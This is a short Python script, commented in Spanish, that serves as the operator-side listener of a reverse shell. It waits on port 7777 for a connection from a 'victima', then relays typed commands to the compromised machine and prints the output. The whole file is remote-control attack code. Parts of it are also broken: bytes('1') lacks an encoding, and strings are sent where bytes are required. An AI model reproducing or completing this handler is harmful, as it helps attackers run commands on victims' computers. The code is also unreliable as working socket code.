import socket


def main():
    server = socket.socket()
    server.bind(('localhost',7777)) #levanto el servidor en local y en el puerto 7777
    server.listen(1) #pongo a la espera de conexión, en este caso 1 espera

    while True:
        victima, direccion = server.accept()
        print(f'Conexión de : {direccion}')

        ver = victima.recv(1024) #recibo los datos del servidor
        print(ver)
        if ver == bytes('1'): #este 1 viene del lado del servidor
            while True:
                opcion = input("shell@shell: ")
                victima.send(opcion) #mandamos el msj
                resultado = victima.recv(2048)
                print(resultado)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Saliendo..')
        exit()

